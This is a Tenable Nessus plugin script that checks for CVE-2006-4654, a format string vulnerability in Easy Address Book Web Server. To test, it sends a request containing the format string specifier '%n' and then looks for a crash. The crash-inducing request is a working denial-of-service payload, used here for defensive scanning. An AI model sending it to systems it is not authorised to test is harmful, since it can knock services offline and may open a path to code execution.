#
# (C) Tenable Network Security
#


if (description)
{
  script_id(22305);
  script_version("$Revision: 1.5 $");

  script_cve_id("CVE-2006-4654");
  script_bugtraq_id(19842);

  script_name(english:"Easy Address Book Web Server Format String Vulnerability");
  script_summary(english:"Tries to crash Easy Address Book Web Server");

  desc = "
Synopsis :

The remote web server is affected by a format string vulnerability. 

Description :

It appears that the remote web server is affected by a remote format
string issue.  Using a specially-crafted URL containing a format
string specifier, an unauthenticated remote attacker can crash the
affected application and possibly execute arbitrary code on the remote
host. 

See also :

http://www.securityfocus.com/archive/1/445262/30/0/threaded

Solution :

Unknown at this time. 

Risk factor :

Medium / CVSS Base Score : 5.5
(AV:R/AC:H/Au:NR/C:P/I:P/A:P/B:N)";
  script_description(english:desc);

  script_category(ACT_DENIAL);
  script_family(english:"CGI abuses");

  script_copyright(english:"This script is Copyright (C) 2006 Tenable Network Security");

  script_dependencies("http_version.nasl");
  script_require_ports("Services/www", 80);

  exit(0);
}


include("http_func.inc");
include("http_keepalive.inc");


port = get_http_port(default:80);
if (!get_port_state(port)) exit(0);


# Make sure it looks like Easy Address Book Web Server.
banner = get_http_banner(port:port);
if (!banner || "Server: Easy Address Book Web Server" >!< banner) exit(0);


# Try to exploit the flaw to crash the server.
if (http_is_dead(port:port)) exit(0);

req = http_get(item:"/?%25n", port:port);
res = http_keepalive_send_recv(port:port, data:req, bodyonly:TRUE);


# There's a problem if the server is now down.
sleep(1);
if (http_is_dead(port:port)) security_warning(port);
